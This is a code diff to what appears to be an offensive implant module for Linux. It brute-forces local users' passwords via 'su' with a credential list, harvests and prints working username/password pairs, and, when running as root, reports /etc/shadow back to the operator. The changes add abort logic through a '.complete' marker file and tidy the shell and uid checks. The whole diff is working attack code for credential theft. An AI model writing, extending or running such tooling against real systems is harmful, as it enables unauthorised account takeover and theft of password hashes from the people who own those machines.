@@ -59,11 +59,7 @@ def read_pam(name, type):
         line = line.strip()
         if not line or line.startswith("#"):
             continue
-        parts = []
-        # NOTE: Custom split function here until eldritchv2 fixes
-        for p in line.split():
-            if p:
-                parts.append(p)
+        parts = line.split()
         if len(parts) < 3:
             continue
         if type in parts[0]:
@@ -112,7 +108,8 @@ def users_with_shells(skip_self=True):
             continue
         #user, hash, uid, gid, comment, home, shell = parts
         user, _, _, _, _, _, shell = line.strip().split(":")
-        if shell in ["/usr/sbin/nologin", "/usr/bin/nologin", "/usr/bin/false", "/bin/false", "/bin/nologin", "/usr/bin/git-shell"]:
+        shell_end = shell.split("/")[-1]
+        if shell_end in ["nologin", "false", "git-shell", "shutdown", "halt"]:
             continue
         users.append(user)
     return users
@@ -164,8 +161,15 @@ def bruteforce_threaded(users, creds, delay, filename, threads=25):
         cmd = ";"+cmd # We run the user cmd AFTER writing the cred token
     threads = 0
     remaining = len(users) * len(creds)
+
+    abort = False
     for u in users:
+        if abort:
+            break
         for p in creds:
+            if file.exists(filename + ".complete"):
+                abort = True
+                break
             usercmd = cmd.replace("{PASS}", p)
             # Token to write
             tok = random.string(10)
@@ -174,7 +178,6 @@ def bruteforce_threaded(users, creds, delay, filename, threads=25):
                     tok = random.string(10)
                     continue
                 break
-
             cred_tokens[tok] = [u, p]
             full_cmd = f"echo {tok} >> {filename}" + usercmd
             sys.exec("su", [u, "-s", "/bin/sh", "--session-command", full_cmd], True, {"HALLIGAN_PASS": p}, input=p+"\n")
@@ -188,8 +191,11 @@ def bruteforce_threaded(users, creds, delay, filename, threads=25):
                 # start more
                 threads = 0
 
-    print(MODNAME, "Brute force complete. waiting for threads to finish.")
-    time.sleep(delay*2)
+    if abort:
+        print(MODNAME, "Brute force aborted (probably due to root beacon).")
+    else:
+        print(MODNAME, "Brute force complete. waiting for threads to finish.")
+        time.sleep(delay*2)
     gathered = []
     for token in file.read(filename).split("\n"):
         if not token.strip():
@@ -206,9 +212,13 @@ def main():
         print("[ERROR] This script is only for Linux")
         return -1
 
-    am_i_root = sys.get_user()['uid']
+    # Set up the temp file. This will check if we have already run on the system
+    filename = get_tmp_dir() + "/tokens"
+
+    am_i_root = sys.get_user()['euid']
     if am_i_root['uid'] == 0:
-        print(f"[ERROR] We are already root, we should brute force hashes not live systems. Aborting.")
+        print(MODNAME, f"We are already root, we should brute force hashes not live systems. Aborting.")
+        sys.shell(f"touch {filename}.complete && chmod 666 {filename}.complete")
         report.file("/etc/shadow")
         return -1
     
@@ -229,9 +239,8 @@ def main():
     bftime = (attempts / threads) * delay
     bftime += delay*2 # Wait for the attempts to finish
 
-    # Set up the temp file. This will check if we have already run on the system
-    filename = get_tmp_dir() + "/tokens"
-    if file.exists(filename):
+
+    if file.exists(filename+".complete"):
         # We have already run. Skipping bruteforce on this system
         print(f"{MODNAME} Bruteforce has already run on this system. Skipping run")
         return 0
@@ -259,5 +268,7 @@ def main():
     print(MODNAME, f"Harvested {len(gathered)} creds in {tm}s")
     for c in gathered:
         print(f"\t[su] {c[0]} - {c[1]}")
+    sys.shell(f"touch {filename}.complete && chmod 666 {filename}.complete")
+    
 
 main()
